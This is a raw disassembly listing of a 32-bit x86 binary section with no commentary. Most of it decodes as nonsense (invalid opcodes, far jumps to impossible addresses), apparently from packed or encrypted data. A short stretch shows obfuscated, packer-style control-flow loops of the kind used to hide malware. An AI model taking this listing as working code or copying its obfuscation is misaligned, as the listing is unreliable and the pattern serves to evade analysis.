  4059e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059ea:	push   cs
  4059eb:	jno    0x405a1a
  4059ed:	xchg   edx,eax
  4059ee:	test   DWORD PTR [esi-0xbfa554f],eax
  4059f4:	loop   0x405984
  4059f6:	sbb    ah,ah
  4059f8:	fdivr  st,st(0)
  4059fa:	retf   
  4059fb:	retf   0x3b5e
  4059fe:	push   0x1a
  405a00:	xchg   esp,eax
  405a01:	loopne 0x405a6d
  405a03:	dec    eax
  405a04:	mov    esi,0x5e7740d7
  405a09:	cmp    eax,0x9ad03d8b
  405a0e:	call   0x69fb:0xa586de0f
  405a15:	es or  eax,0x9e3cee68
  405a1b:	mov    ecx,ebp
  405a1d:	mov    cl,0x76
  405a1f:	inc    edi
  405a20:	xlat   BYTE PTR ds:[ebx]
  405a21:	adc    ch,BYTE PTR [eax]
  405a23:	in     al,dx
  405a24:	mov    ebp,0x6bc4104c
  405a29:	mov    esi,ebp
  405a2b:	popa   
  405a2c:	popf   
  405a2d:	jge    0x4059c0
  405a2f:	add    BYTE PTR [ebx],ah
  405a31:	jnp    0x4059db
  405a33:	mov    ch,0x23
  405a35:	or     ecx,ebp
  405a37:	mov    esp,0x9d0a51e2
  405a3c:	call   FWORD PTR [ebp-0x79d470e5]
  405a42:	ins    BYTE PTR es:[edi],dx
  405a43:	sahf   
  405a44:	addr16 push 0x1583b7d9
  405a4a:	ror    DWORD PTR [ebp-0x59811933],1
  405a50:	sbb    DWORD PTR [edx+esi*4+0x2a8f4ed5],esi
  405a57:	test   eax,0x2c9ad529
  405a5c:	sbb    eax,ecx
  405a5e:	mov    dl,0xbb
  405a60:	xchg   esi,eax
  405a61:	fs (bad) 
  405a63:	sbb    eax,DWORD PTR [esi-0x13bc8274]
  405a69:	inc    ebx
  405a6a:	retf   
  405a6b:	pop    edi
  405a6c:	mov    eax,0xf527af2d
  405a71:	mov    al,0xa2
  405a73:	push   cs
  405a74:	in     al,dx
  405a75:	mov    BYTE PTR [edi],bl
  405a77:	int    0xa9
  405a79:	aad    0xdb
  405a7b:	loope  0x405a1e
  405a7d:	cmp    ebx,DWORD PTR [ebx*1+0x130d36fd]
  405a84:	inc    edi
  405a85:	add    al,0xbf
  405a87:	jmp    0x5a3e:0x24a08000
  405a8e:	pop    ss
  405a8f:	xchg   ebx,eax
  405a90:	cmp    DWORD PTR [ebp-0x388ac253],ecx
  405a96:	test   eax,0x285c9aa9
  405a9b:	add    BYTE PTR [eax-0x66],dl
  405a9e:	mov    edi,0xe568e512
  405aa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405aa4:	lods   al,BYTE PTR ds:[esi]
  405aa5:	and    edi,DWORD PTR ds:0xde21b548
  405aab:	pop    ebx
  405aac:	mov    ebx,0x76fe149e
  405ab1:	out    0x14,al
  405ab3:	or     bh,ch
  405ab5:	loop   0x405a5e
  405ab7:	out    dx,eax
  405ab8:	mov    dl,BYTE PTR [ebp-0x11]
  405abb:	xor    BYTE PTR es:[ebp+0x49],bl
  405abf:	pop    es
  405ac0:	call   0x1afb:0xb631fc7d
  405ac7:	call   0xdace62f9
  405acc:	icebp  
  405acd:	mov    BYTE PTR [ebx-0x746d87c],cl
  405ad3:	mov    WORD PTR [edi-0x129d749f],gs
  405ad9:	push   esp
  405ada:	xor    al,0x21
  405adc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405add:	data16 neg BYTE PTR [ecx]
  405ae0:	loop   0x405b2e
  405ae2:	jmp    0xf39f:0xaf30035e
  405ae9:	pushf  
  405aea:	add    ebx,DWORD PTR [edi]
  405aec:	inc    esp
  405aed:	nop
  405aee:	push   ds
  405aef:	shr    BYTE PTR [ebx-0x2f],1
  405af2:	sbb    bh,BYTE PTR [eax+0x11]
  405af5:	and    al,0x8a
  405af7:	int3   
  405af8:	jb     0x405b21
  405afa:	xor    al,0x22
  405afc:	lock mov ds:0xbf59e1a0,al
  405b02:	stc    
  405b03:	rdpmc  
  405b05:	jbe    0x405af5
  405b07:	xlat   BYTE PTR ds:[ebx]
  405b08:	bound  esi,QWORD PTR ds:0x540dea52
  405b0e:	lods   eax,DWORD PTR ds:[esi]
  405b0f:	sub    al,0xe6
  405b11:	inc    ecx
  405b12:	cmp    bl,ch
  405b14:	retf   
  405b15:	lds    ecx,FWORD PTR [esi+ebp*1-0x75]
  405b19:	mov    cs:0xe5cb1bbc,al
  405b1f:	or     DWORD PTR [edi-0x3cf7620d],ecx
  405b25:	pop    esi
  405b26:	lahf   
  405b27:	jl     0x405ba6
  405b29:	jbe    0x405b53
  405b2b:	inc    esp
  405b2c:	or     eax,0x66aee5c5
  405b31:	dec    esi
  405b32:	mov    DWORD PTR [ebp+0x10],ecx
  405b35:	mov    ecx,0xc6d
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43369b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433653,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4336a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4336ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43372f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0xac768594
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405c12
  405be0:	cli    
  405be1:	js     0x405c26
  405be3:	push   es
  405be4:	in     eax,0x56
  405be6:	cwde   
  405be7:	test   BYTE PTR [edx+eax*4-0x52],ah
  405beb:	leave  
  405bec:	call   0x5cd19b53
  405bf1:	lea    esi,[eax]
  405bf3:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  405bf5:	jns    0x405b97
  405bf7:	xchg   edx,eax
  405bf8:	xor    ch,dl
  405bfa:	punpckhwd mm2,QWORD PTR [esi]
  405bfd:	jmp    0x405c7a
  405bff:	push   eax
  405c00:	dec    ecx
  405c01:	add    bh,BYTE PTR [edi+eiz*1-0x26]
  405c05:	fdivr  QWORD PTR [ecx+0x63]
  405c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c09:	and    al,BYTE PTR [edi-0x7d]
  405c0c:	pop    ecx
  405c0d:	pop    es
  405c0e:	mov    ds:0xb4677207,al
  405c13:	add    eax,0x38fc33ef
  405c18:	add    esi,DWORD PTR [ebp-0xa5ce866]
  405c1e:	retf   
  405c1f:	fidivr WORD PTR [eax+0x43ab0b1a]
  405c25:	ficomp DWORD PTR [eax]
  405c27:	jno    0x405be8
  405c29:	push   eax
  405c2a:	clc    
  405c2b:	ins    BYTE PTR es:[edi],dx
  405c2c:	xor    BYTE PTR [ebx],0x8d
  405c2f:	lds    edi,FWORD PTR [eax+0x4a]
  405c32:	std    
  405c33:	hlt    
  405c34:	jg     0x405c86
  405c36:	xor    ch,BYTE PTR ds:[esi]
  405c39:	adc    ebp,eax
  405c3b:	push   cs
  405c3c:	adc    al,0x17
  405c3e:	cmp    al,0x64
  405c40:	jbe    0x405ca3
  405c42:	pop    ss
  405c43:	jo     0xc1d0a550
  405c49:	dec    edx
  405c4a:	fsub   DWORD PTR [esi]
  405c4c:	aas    
  405c4d:	out    0x88,eax
  405c4f:	xor    dh,BYTE PTR [ecx]
  405c51:	xchg   BYTE PTR [ecx],ch
  405c53:	pop    edx
  405c54:	in     al,dx
  405c55:	xor    DWORD PTR [ecx+0x33],edi
  405c58:	ins    DWORD PTR es:[edi],dx
  405c59:	scas   eax,DWORD PTR es:[edi]
  405c5a:	into   
  405c5b:	pop    eax
  405c5c:	xor    DWORD PTR [edi-0x46],eax
  405c5f:	push   ebx
  405c60:	leave  
  405c61:	nop
  405c62:	cld    
  405c63:	call   0x1067e84e
  405c68:	mov    bl,0xcf
  405c6a:	push   es
  405c6b:	mov    eax,ds:0x5e6ba305
  405c70:	jge    0x405c33
  405c72:	cmp    al,0x74
  405c74:	fdiv   st(0),st
  405c76:	pcmpgtb mm4,QWORD PTR [esi+edi*2-0x62342773]
  405c7e:	(bad)  
  405c7f:	imul   cl
  405c81:	push   cs
  405c82:	sub    eax,0xfaca8833
  405c87:	sbb    eax,0xc098c105
  405c8c:	fimul  WORD PTR [ebp-0x46bc318a]
  405c92:	and    DWORD PTR [edi],0x2dd756
  405c98:	enter  0x261d,0x54
  405c9c:	sar    DWORD PTR [ebx+0x33],0xd2
  405ca0:	jmp    0xf16cbd27
  405ca5:	xchg   edi,eax
  405ca6:	push   es
  405ca7:	inc    edi
  405ca8:	xchg   edi,eax
  405ca9:	in     al,0x5f
  405cab:	adc    esp,DWORD PTR [eax]
  405cad:	mov    WORD PTR [ebp-0x29e93ba],ds
  405cb3:	mov    esi,0x9f159943
  405cb8:	iret   
  405cb9:	inc    ecx
  405cba:	xchg   ecx,eax
  405cbb:	sub    ebx,DWORD PTR [ecx]
  405cbd:	cmp    DWORD PTR [ebx],eax
  405cbf:	xor    dh,dh
  405cc1:	push   edx
  405cc2:	xchg   esp,eax
  405cc3:	inc    esp
  405cc4:	inc    edi
  405cc5:	leave  
  405cc6:	enter  0x5df0,0xfa
  405cca:	jne    0x405ce8
  405ccc:	sub    BYTE PTR [ecx-0x7aca7a21],0x31
  405cd3:	ins    BYTE PTR es:[edi],dx
  405cd4:	or     bl,BYTE PTR [eax]
  405cd6:	in     al,dx
  405cd7:	sbb    ebp,esp
  405cd9:	fdivr  QWORD PTR [ebx+0x613da6fc]
  405cdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ce0:	push   0x83cb8a7b
  405ce5:	add    DWORD PTR [ebp-0x80],esi
  405ce8:	sub    ecx,DWORD PTR [ebx-0x76a272fb]
  405cee:	call   0x85c8:0xdc6dee2d
  405cf5:	ja     0x76118c3a
  405cfb:	into   
  405cfc:	xor    eax,0x19af3079
  405d01:	adc    BYTE PTR [edi+edx*4+0x14e06a52],ch
  405d08:	out    dx,al
  405d09:	jg     0x405c9c
  405d0b:	ret    
  405d0c:	mov    al,ds:0x8f945e7b
  405d11:	mov    WORD PTR [edi+0x5b5ee3e],?
  405d17:	ds stc 
  405d19:	sub    eax,0x8094613
  405d1e:	call   0x5d6df86e
  405d23:	and    eax,0xe633c3fe
  405d28:	retf   
  405d29:	sub    esp,ecx
  405d2b:	outs   dx,DWORD PTR ds:[esi]
  405d2c:	in     eax,dx
  405d2d:	mov    edi,0xe1d88472
  405d32:	aad    0x10
  405d34:	add    DWORD PTR [esi+ecx*2],ebx
  405d37:	mov    ah,0xaf
  405d39:	pop    ss
  405d3a:	pop    edi
  405d3b:	add    esp,DWORD PTR [edi+0x1c]
  405d3e:	loope  0x405dac
  405d40:	push   ss
  405d41:	jae    0x405d05
  405d43:	inc    ecx
  405d44:	xor    eax,0xf609c299
  405d49:	repz inc eax
  405d4b:	jmp    0xe01fddce
  405d50:	adc    bl,cl
  405d52:	or     bh,bh
  405d54:	ins    BYTE PTR es:[edi],dx
  405d55:	xchg   ebp,eax
  405d56:	ja     0x405da2
  405d58:	(bad)  
  405d59:	enter  0x7d53,0x18
  405d5d:	cmp    BYTE PTR [ebp+ebx*1-0x5b51bec3],bh
  405d64:	xor    al,0x70
  405d66:	arpl   di,ax
  405d68:	imul   ebp,esi,0x3a989957
  405d6e:	sbb    ch,bl
  405d70:	xor    eax,0x359d8919
  405d75:	out    0x3,eax
  405d77:	mov    ebx,DWORD PTR [esi-0x2acb346]
  405d7d:	xor    al,BYTE PTR [esi]
  405d7f:	jecxz  0x405dc3
  405d81:	add    bl,BYTE PTR [esi]
  405d83:	pop    eax
  405d84:	cvtps2pd xmm3,QWORD PTR [edi]
  405d87:	popf   
  405d88:	pop    ecx
  405d89:	adc    esp,DWORD PTR [edi-0x689bfe14]
  405d8f:	sub    eax,0x1c664fe7
  405d94:	sbb    ch,ch
  405d96:	xchg   ah,dh
  405d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d99:	xchg   esi,eax
  405d9a:	jbe    0x405d35
  405d9c:	mov    ebp,0x20e64a7f
  405da1:	aaa    
  405da2:	(bad)  
  405da3:	sti    
  405da4:	cdq    
  405da5:	lock add BYTE PTR [ebp-0x80],0xfc
  405daa:	and    eax,0x11b72420
  405daf:	(bad)  [ebx-0x80]
  405db2:	mov    esi,0xc4516a9e
  405db7:	or     al,0x13
  405db9:	pop    ebx
  405dba:	mov    al,0x41
  405dbc:	mov    edi,0x9217bb61
  405dc1:	mov    esp,0xc8332592
  405dc6:	pop    ebx
  405dc7:	fisubr WORD PTR [edx-0x463c6cb5]
  405dcd:	jp     0x405dc6
  405dcf:	out    dx,eax
  405dd0:	dec    edi
  405dd1:	dec    esp
  405dd2:	lock jns 0x405e21
  405dd5:	int    0x7c
  405dd7:	pop    eax
  405dd8:	aas    
  405dd9:	add    bl,BYTE PTR [ebx]
  405ddb:	inc    edx
  405ddc:	push   es
  405ddd:	fild   DWORD PTR [esi]
  405ddf:	or     esp,DWORD PTR [ebp-0x4c54bbab]
  405de5:	dec    ecx
  405de6:	cmp    eax,DWORD PTR [edi]
  405de8:	inc    edi
  405de9:	xchg   edx,eax
  405dea:	shr    DWORD PTR [ebp+0x4f689a3a],cl
  405df0:	dec    ecx
  405df1:	mov    BYTE PTR [edx-0x62],bh
  405df4:	loop   0x405e14
  405df6:	imul   esi,DWORD PTR [ebx-0x6],0x23fe0c41
  405dfd:	jmp    0x946e9fce
  405e02:	nop
  405e03:	or     al,0x7e
  405e05:	pop    edi
  405e06:	popf   
  405e07:	jmp    0x1633:0xc1e43943
  405e0e:	dec    ebx
  405e0f:	inc    ecx
  405e11:	stos   BYTE PTR es:[edi],al
  405e12:	and    edi,eax
  405e14:	imul   edi,DWORD PTR [ebp-0x2f],0x4f
  405e18:	mov    edi,0xea7a71d3
  405e1d:	jmp    0x1c3ad58a
  405e22:	sbb    DWORD PTR [eax-0x3503693d],ebx
  405e28:	lea    edi,[ebp+0x4c746af0]
  405e2e:	fs (bad) 
  405e30:	cmc    
  405e31:	jmp    0xeca2:0xd01bf6f
  405e38:	and    eax,0x7dba1241
  405e3d:	data16 sbb al,0x68
  405e40:	xor    BYTE PTR [edi+0x72d4c64a],dl
  405e46:	test   al,0x0
  405e48:	test   BYTE PTR fs:[eax-0x70c41a9f],ah
  405e4f:	js     0x405e27
  405e51:	xchg   esi,eax
  405e52:	xchg   edx,eax
  405e53:	and    ah,BYTE PTR [ebp-0x21]
  405e56:	mov    ds:0x76b1c0e8,eax
  405e5b:	aad    0xc
  405e5d:	push   esi
  405e5e:	jle    0x405e9d
  405e60:	xor    ah,dh
  405e62:	and    ch,BYTE PTR [ecx-0x49d56f2e]
  405e68:	or     eax,0x970d34c8
  405e6d:	daa    
  405e6e:	(bad)  
  405e70:	pusha  
  405e71:	mov    ds:0xf3fb449f,eax
  405e76:	push   ss
  405e77:	repz sbb eax,0xc5c8cca6
  405e7d:	push   ebp
  405e7e:	pop    esi
  405e7f:	aas    
  405e80:	push   ebp
  405e81:	xchg   edi,eax
  405e82:	es push ss
  405e84:	xchg   esi,eax
  405e85:	lds    eax,FWORD PTR [edx+edi*8-0x193d58fd]
  405e8c:	xchg   ebp,edi
  405e8e:	add    al,0xa5
  405e90:	inc    edx
  405e91:	sbb    eax,0xd90140ea
  405e96:	and    BYTE PTR [esi+0x7a1325a9],dh
  405e9c:	dec    ebx
  405e9d:	ins    BYTE PTR es:[edi],dx
  405e9e:	int    0x2f
  405ea0:	ja     0x405e76
  405ea2:	add    bh,0x60
  405ea5:	in     eax,0xb3
  405ea7:	cmp    DWORD PTR [ebp+0x6612737a],edi
  405ead:	fnstsw WORD PTR [ecx]
  405eaf:	mov    WORD PTR [ecx+0x5d],es
  405eb2:	lock pop ds
  405eb4:	(bad)  
  405eb5:	hlt    
  405eb6:	pop    ebx
  405eb7:	in     al,dx
  405eb8:	push   ss
  405eb9:	mov    ebx,0xc4e9a552
  405ebe:	lea    ecx,[ebx+0x48]
  405ec1:	mov    bh,0x1a
  405ec3:	bound  esp,QWORD PTR [esi+edi*8]
  405ec6:	add    eax,0x7cd9e360
  405ecb:	int    0x4e
  405ecd:	mov    WORD PTR [eax-0x5b],?
  405ed0:	inc    esp
  405ed1:	jno    0x405f1a
  405ed3:	mov    edi,0x8f8733fb
  405ed8:	pop    edi
  405ed9:	mov    edx,0x8982893b
  405ede:	and    DWORD PTR [edx],ecx
  405ee0:	not    BYTE PTR [edi+0x78]
  405ee3:	cmp    al,0xf4
  405ee5:	(bad)  
  405ee6:	int3   
  405ee7:	scas   al,BYTE PTR es:[edi]
  405ee8:	sahf   
  405ee9:	mov    ds:0x11ee4f95,al
  405eee:	js     0x405e7c
  405ef0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ef1:	in     eax,0x84
  405ef3:	sub    al,BYTE PTR [esi-0x53]
  405ef6:	or     al,0xe4
  405ef8:	retf   0x1b3a
  405efb:	push   0x3801e120
  405f00:	loop   0x405eff
  405f02:	mov    dl,0xc4
  405f04:	pop    edx
  405f05:	dec    ebx
  405f06:	add    al,0x29
  405f08:	(bad)  [eax+edi*1]
  405f0b:	pusha  
  405f0c:	loopne 0x405ea6
  405f0e:	cmp    DWORD PTR [ecx-0x80ecc3b],edi
  405f14:	fldl2t 
  405f16:	dec    edx
  405f17:	add    eax,DWORD PTR [eax]
  405f19:	add    BYTE PTR [ebp-0x2e],dh
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [ecx-0x5900566d],gs
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	xchg   edx,eax
  405f33:	sbb    dh,BYTE PTR [ebx+ebp*2+0x71]
  405f37:	imul   BYTE PTR [edi]
  405f39:	sub    dh,ah
  405f3b:	stos   BYTE PTR es:[edi],al
  405f3c:	push   0xaed30cb3
  405f41:	push   cs
  405f42:	push   cs
  405f43:	add    eax,0x370e66e4
  405f48:	rcl    DWORD PTR [esi+0x6b],cl
  405f4b:	jecxz  0x405f3b
  405f4d:	sbb    DWORD PTR [ecx-0x564271bd],eax
  405f53:	ret    0x5f42
  405f56:	mov    edx,0x5bde4c8d
  405f5b:	cmp    bl,BYTE PTR [ebx]
  405f5d:	ret    
  405f5e:	jecxz  0x405efa
  405f60:	stos   BYTE PTR es:[edi],al
  405f61:	mov    ecx,0x438e9cde
  405f66:	jae    0x405f5b
  405f68:	xchg   esp,eax
  405f69:	xchg   edx,eax
  405f6a:	ds jae 0x405fa9
  405f6d:	xlat   BYTE PTR ds:[ebx]
  405f6e:	jg     0x405f70
  405f70:	xor    al,0xb3
  405f72:	sub    DWORD PTR [ebp+0x7c055e6c],esi
  405f78:	out    dx,eax
  405f79:	(bad)  
  405f7a:	stos   BYTE PTR es:[edi],al
  405f7b:	test   al,0x43
  405f7d:	popa   
  405f7e:	sbb    al,0x7f
  405f80:	jb     0x405f82
  405f82:	shr    BYTE PTR [esi+edi*8+0x693bcdd4],cl
  405f89:	scas   al,BYTE PTR es:[edi]
  405f8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f8b:	push   ebp
  405f8c:	ds dec ecx
  405f8e:	or     eax,DWORD PTR [esi]
  405f90:	and    DWORD PTR [edi-0x3f],eax
  405f93:	fdiv   st(1),st
  405f95:	push   edx
  405f96:	adc    ebx,edx
  405f98:	xchg   esp,eax
  405f99:	xor    DWORD PTR ss:[edi],esp
  405f9c:	inc    edi
  405f9d:	inc    edx
  405f9e:	test   eax,0x33df8262
  405fa3:	nop
  405fa4:	add    al,0xde
  405fa6:	mov    esp,esp
  405fa8:	or     eax,0x6af6bce1
  405fad:	adc    bl,BYTE PTR [eax-0xd197bb9]
  405fb3:	dec    edx
  405fb4:	cs (bad) 
  405fb6:	dec    esi
  405fb7:	inc    ecx
  405fb8:	and    eax,0xc969f259
  405fbd:	add    al,0xfd
  405fbf:	dec    ecx
  405fc0:	mov    BYTE PTR [ebx+0x2c],al
  405fc3:	in     al,dx
  405fc4:	mov    ecx,0xa4185b0c
  405fc9:	sti    
  405fca:	add    bh,BYTE PTR [edi+0x71]
  405fcd:	mov    bl,0x37
  405fcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fd0:	and    eax,0xf90b708b
  405fd5:	not    BYTE PTR [ebx]
  405fd7:	ss fwait
  405fd9:	push   es
  405fda:	sbb    DWORD PTR [ebx],esp
  405fdc:	sub    al,0xbe
  405fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fdf:	lahf   
  405fe0:	ja     0x406033
  405fe2:	shr    BYTE PTR [eiz*2-0x6dc80c25],1
  405fe9:	fsub   DWORD PTR [esi-0x138b7731]
  405fef:	mov    ss,WORD PTR [edx+ecx*8-0x6f]
  405ff3:	jp     0x405f7d
  405ff5:	ret    
  405ff6:	dec    esi
  405ff7:	push   esi
  405ff8:	push   ebp
  405ff9:	leave  
  405ffa:	push   ss
  405ffb:	in     eax,0xcd
  405ffd:	sahf   
  405ffe:	inc    esi
  405fff:	mov    bl,0x7f
  406001:	pushf  
  406002:	pop    ebp
  406003:	stos   BYTE PTR es:[edi],al
  406004:	scas   eax,DWORD PTR es:[edi]
  406005:	mov    edi,DWORD PTR fs:[edx-0x70830efb]
  40600c:	add    eax,0x4ff8a2a0
  406011:	xor    BYTE PTR [edi-0x2a9c73be],0xf1
  406018:	rcr    BYTE PTR [edi+ecx*4+0x74194e8b],1
  40601f:	dec    esi
  406020:	xchg   esp,eax
  406021:	in     al,dx
  406022:	jp     0x40608d
  406024:	mov    bl,bl
  406026:	mov    ss,edi
  406028:	and    ecx,DWORD PTR cs:[edx+0x1b]
  40602c:	aaa    
  40602d:	xlat   BYTE PTR ds:[ebx]
  40602e:	xor    edx,edx
  406030:	inc    eax
  406032:	or     eax,DWORD PTR [ebp-0x3]
  406035:	test   DWORD PTR [esi-0x6f],ecx
  406038:	lods   eax,DWORD PTR ds:[esi]
  406039:	or     BYTE PTR [edx],bh
  40603b:	adc    esp,esi
  40603d:	inc    BYTE PTR [edx+0x24]
  406040:	sub    DWORD PTR [ecx-0x6b],esi
  406043:	out    0x5b,al
  406045:	xchg   edi,edx
  406047:	std    
  406048:	sbb    DWORD PTR es:[eax-0x2ff15c45],eax
  40604f:	jno    0x40606a
  406051:	shr    BYTE PTR [ecx],cl
  406053:	stos   DWORD PTR es:[edi],eax
  406054:	dec    ecx
  406055:	lahf   
  406056:	int3   
  406057:	cmp    al,0x8d
  406059:	adc    eax,DWORD PTR [esi-0x2f]
  40605c:	loopne 0x40601d
  40605e:	mov    ebp,0xd0622ce9
  406063:	jnp    0x406013
  406065:	push   ss
  406066:	rol    BYTE PTR [ecx],0x5d
  406069:	fld    TBYTE PTR [eax-0x71]
  40606c:	es ss push ds
  40606f:	fbstp  TBYTE PTR [edx+ecx*8-0x6a]
  406073:	js     0x40604e
  406075:	pop    esp
  406076:	sbb    esi,DWORD PTR [edx]
  406078:	mov    ds:0x16b67f97,eax
  40607d:	pop    esi
  40607e:	inc    eax
  40607f:	xlat   BYTE PTR ds:[ebx]
  406080:	and    eax,0x668838ff
  406085:	xchg   esp,eax
  406086:	rcl    BYTE PTR [edx+ebx*1-0x19bfb8d],1
  40608d:	xchg   edx,eax
  40608e:	xor    bl,BYTE PTR [eax]
  406090:	(bad)  
  406091:	lods   al,BYTE PTR ds:[esi]
  406092:	loopne 0x40603d
  406094:	xchg   BYTE PTR [ebx-0x7b],cl
  406097:	ror    BYTE PTR [edi+0x70],1
  40609a:	xor    BYTE PTR [edi+0x31],ch
  40609d:	out    dx,al
  40609e:	mov    esp,ebp
  4060a0:	out    dx,eax
  4060a1:	xchg   ecx,eax
  4060a2:	mov    ?,WORD PTR [esi-0x726e8f72]
  4060a8:	xor    eax,0xad03eea3
  4060ad:	jns    0x4060b1
  4060af:	xor    DWORD PTR [edi],esp
  4060b1:	and    DWORD PTR [eax-0x54],edi
  4060b4:	dec    BYTE PTR [ebp+0x4e6cc6bb]
  4060ba:	in     eax,0xed
  4060bc:	add    esi,DWORD PTR [edi-0x4e0d44db]
  4060c2:	cmp    al,0xa6
  4060c4:	xchg   ebp,eax
  4060c5:	lahf   
  4060c6:	leave  
  4060c7:	adc    BYTE PTR [edx],0xef
  4060ca:	jge    0x406055
  4060cc:	inc    esi
  4060cd:	mov    ebx,0xcdc88c9f
  4060d2:	pop    esi
  4060d3:	cwde   
  4060d4:	pop    ds
  4060d5:	mov    eax,DWORD PTR [eax-0x30d87e97]
  4060db:	and    ecx,DWORD PTR ds:0xf7acddb1
  4060e1:	shl    DWORD PTR [esi+0x4],0xeb
  4060e5:	push   ebp
  4060e6:	inc    ebx
  4060e7:	sar    DWORD PTR [eax],0xfe
  4060ea:	les    esi,FWORD PTR [eax-0x3b676e02]
  4060f0:	ins    DWORD PTR es:[edi],dx
  4060f1:	adc    bl,BYTE PTR [edx]
  4060f3:	push   es
  4060f4:	aam    0x36
  4060f6:	adc    BYTE PTR [edx],0xd6
  4060f9:	test   BYTE PTR [ebx],ah
  4060fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060fc:	shl    DWORD PTR [ebp-0x2787ef68],1
  406102:	add    ecx,ecx
  406104:	lea    esi,[edi]
  406106:	aad    0x26
  406108:	loope  0x4060dd
  40610a:	shr    esp,1
  40610c:	or     DWORD PTR [eax],edx
  40610e:	push   esi
  40610f:	call   0xfd25:0x7c118efb
  406116:	enter  0xb7e9,0x7b
  40611a:	loop   0x4060e0
  40611c:	push   0xeaa87830
  406121:	pop    ecx
  406122:	mov    ds,WORD PTR [edi-0x72]
  406125:	cmp    BYTE PTR [ecx+0x5a576e87],ch
  40612b:	fmul   DWORD PTR [ebp-0x2a]
  40612e:	outs   dx,BYTE PTR ds:[esi]
  40612f:	mov    ?,WORD PTR [esi+ebp*1]
  406132:	pop    ds
  406133:	and    al,0xde
  406135:	cmp    ch,BYTE PTR [ebp-0x76]
  406138:	das    
  406139:	pop    es
  40613a:	iret   
  40613b:	lods   eax,DWORD PTR ds:[esi]
  40613c:	sbb    edi,edx
  40613e:	jl     0x4060f3
  406140:	push   ebp
  406141:	jle    0x40617a
  406143:	cli    
  406144:	push   0xff55d472
  406149:	ins    WORD PTR es:[edi],dx
  40614b:	jmp    0x97846724
  406150:	xor    dh,BYTE PTR [ebx+0x57]
  406153:	retf   
  406154:	inc    edx
  406155:	pop    ebp
  406156:	pop    edi
  406157:	outs   dx,DWORD PTR ds:[esi]
  406158:	mov    al,ds:0xe9c21176
  40615d:	rol    WORD PTR [eax-0x414cded1],cl
  406164:	sub    al,0x7
  406166:	bound  esp,QWORD PTR [ecx]
  406168:	jbe    0x40617a
  40616a:	push   esp
  40616b:	retf   0x7c6c
  40616e:	or     eax,0x9021176a
  406173:	call   0xe38:0x45cc3c8b
  40617a:	in     al,dx
  40617b:	lea    edx,[esp+edi*2]
  40617e:	mov    BYTE PTR [edx-0x46db2016],dl
  406184:	ret    
  406185:	stos   BYTE PTR es:[edi],al
  406186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406187:	push   ss
  406188:	or     al,0x18
  40618a:	test   eax,0xfe5f8ba1
  40618f:	in     eax,dx
  406190:	enter  0x50f3,0x9e
  406194:	sbb    esi,DWORD PTR [ebp+ebx*2+0x75929428]
  40619b:	je     0x406120
  40619d:	inc    ebp
  40619e:	adc    eax,0x2c916d82
  4061a3:	fcomp  DWORD PTR fs:[edi-0x20]
  4061a7:	fadd   QWORD PTR [edi+esi*1]
  4061aa:	fldenv [edi-0x5d0c7d9a]
  4061b0:	xchg   ebx,eax
  4061b1:	fdiv   st(2),st
  4061b3:	xor    DWORD PTR [ebp-0x637f09d],esp
  4061b9:	ja     0x406161
  4061bb:	push   0x6b0ffa2a
  4061c0:	outs   dx,BYTE PTR ds:[esi]
  4061c1:	in     al,0x14
  4061c3:	or     bl,BYTE PTR [eax+ecx*4+0x308a657e]
  4061ca:	cli    
  4061cb:	pop    edi
  4061cc:	xchg   edx,eax
  4061cd:	jbe    0x406163
  4061cf:	hlt    
  4061d0:	or     al,0xcf
  4061d2:	mov    al,ds:0x49c4f882
  4061d7:	in     al,dx
  4061d8:	mov    es,WORD PTR [ecx+0x242ede69]
  4061de:	lods   eax,DWORD PTR ds:[esi]
  4061df:	cmp    esi,DWORD PTR [edi-0x1c8a76f4]
  4061e5:	scas   al,BYTE PTR es:[edi]
  4061e6:	arpl   WORD PTR [edx+edx*1],cx
  4061e9:	lods   eax,DWORD PTR ds:[esi]
  4061ea:	icebp  
  4061eb:	jnp    0x40616f
  4061ed:	inc    esi
